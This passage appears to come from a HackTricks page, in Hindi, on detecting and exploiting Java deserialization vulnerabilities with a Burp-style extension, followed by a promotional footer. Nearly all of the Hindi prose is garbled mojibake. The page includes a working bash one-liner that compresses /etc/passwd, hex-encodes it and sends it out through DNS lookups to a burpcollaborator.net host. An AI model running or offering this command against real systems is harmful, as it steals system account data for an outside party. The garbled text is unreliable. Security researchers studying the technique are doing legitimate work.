‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡•á‡§ó‡§æ ‡§î‡§∞ ‡§µ‡§Ç‡§∞‡•ç‡§®‡§∞‡§¨‡§≤ ‡§µ‡§æ‡§≤‡•á ‡§ï‡•ã ‡§π‡§æ‡§á‡§≤‡§æ‡§á‡§ü ‡§ï‡§∞‡•á‡§ó‡§æ‡•§ **‡§µ‡§Ç‡§∞‡•ç‡§®‡§∞‡§¨‡§≤ ‡§™‡•Å‡§∏‡•ç‡§§‡§ï‡§æ‡§≤‡§Ø‡•ã‡§Ç** ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§™ **Javas Sleeps**, **CPU** ‡§â‡§™‡§≠‡•ã‡§ï‡•ç‡§§‡§ø ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á **sleeps**, ‡§Ø‡§æ ‡§™‡§π‡§≤‡•á ‡§∏‡•á ‡§π‡•Ä ‡§â‡§≤‡•ç‡§≤‡§ø‡§ñ‡§ø‡§§ **DNS** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

**‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü‡§ø‡§Ç‡§ó**

‡§è‡§ï ‡§µ‡§Ç‡§∞‡•ç‡§®‡§∞‡§¨‡§≤ ‡§™‡•Å‡§∏‡•ç‡§§‡§ï‡§æ‡§≤‡§Ø ‡§ï‡•Ä ‡§™‡§π‡§ö‡§æ‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§Ü‡§™ ‡§∞‡§ø‡§ï‡•ç‡§µ‡•á‡§∏‡•ç‡§ü ‡§ï‡•ã _‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü‡§ø‡§Ç‡§ó ‡§ü‡•à‡§¨_ ‡§Æ‡•á‡§Ç ‡§≠‡•á‡§ú ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§\
‡§á‡§∏ ‡§ü‡•à‡§¨ ‡§Æ‡•á‡§Ç ‡§Ü‡§™‡§ï‡•ã ‡§´‡§ø‡§∞ ‡§∏‡•á **‡§á‡§®‡•ç‡§ú‡•á‡§ï‡•ç‡§∂‡§® ‡§™‡•â‡§á‡§Ç‡§ü** ‡§ï‡§æ ‡§ö‡§Ø‡§® ‡§ï‡§∞‡§®‡§æ ‡§π‡•ã‡§ó‡§æ, ‡§î‡§∞ **‡§µ‡§Ç‡§∞‡•ç‡§®‡§∞‡§¨‡§≤ ‡§™‡•Å‡§∏‡•ç‡§§‡§ï‡§æ‡§≤‡§Ø** ‡§ú‡§ø‡§∏‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§™ ‡§™‡•á‡§≤‡•ã‡§° ‡§¨‡§®‡§æ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç, ‡§î‡§∞ **‡§ï‡§Æ‡§æ‡§Ç‡§°**‡•§ ‡§´‡§ø‡§∞, ‡§â‡§ö‡§ø‡§§ **‡§π‡§Æ‡§≤‡§æ** ‡§¨‡§ü‡§® ‡§¶‡§¨‡§æ‡§è‡§Ç‡•§

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/4 (1).png>)

### ‡§ú‡§æ‡§µ‡§æ ‡§°‡§ø‡§∏‡•Ä‡§∞‡§ø‡§Ø‡§≤‡§æ‡§á‡§ú‡§º‡•á‡§∂‡§® DNS Exfil ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä

‡§Ö‡§™‡§®‡•á ‡§™‡•á‡§≤‡•ã‡§° ‡§ï‡•ã ‡§ï‡•Å‡§õ ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§ï‡§æ ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§æ‡§®‡•ç‡§µ‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç:
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### ‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

<details>

<summary><strong>‡§ú‡§æ‡§®‡•á‡§Ç AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡•ã ‡§∂‡•Ç‡§®‡•ç‡§Ø ‡§∏‡•á ‡§π‡•Ä‡§∞‡•ã ‡§§‡§ï</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á:

* ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§Ö‡§™‡§®‡•Ä **‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡§æ ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§® HackTricks ‡§Æ‡•á‡§Ç ‡§¶‡•á‡§ñ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§Ø‡§æ **HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§§‡•ã [**‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§™‡•ç‡§≤‡§æ‡§®‡•ç‡§∏ ‡§¶‡•á‡§ñ‡•á‡§Ç**](https://github.com/sponsors/carlospolop)!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS & HackTricks ‡§∏‡•ç‡§µ‡•à‡§ó**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* ‡§π‡§Æ‡§æ‡§∞‡•á ‡§µ‡§ø‡§∂‡•á‡§∑ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§ï‡§≤‡•á‡§ï‡•ç‡§∂‡§®, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ñ‡•ã‡§ú‡•á‡§Ç
* **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** üí¨ [**‡§°‡§ø‡§∏‡•ç‡§ï‡•â‡§∞‡•ç‡§° ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ ‡§π‡§Æ‡•á‡§Ç **‡§ü‡•ç‡§µ‡§ø‡§ü‡§∞** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)** ‡§™‡§∞ ‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç‡•§
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç, HackTricks** ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos ‡§Æ‡•á‡§Ç PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á‡•§

</details>
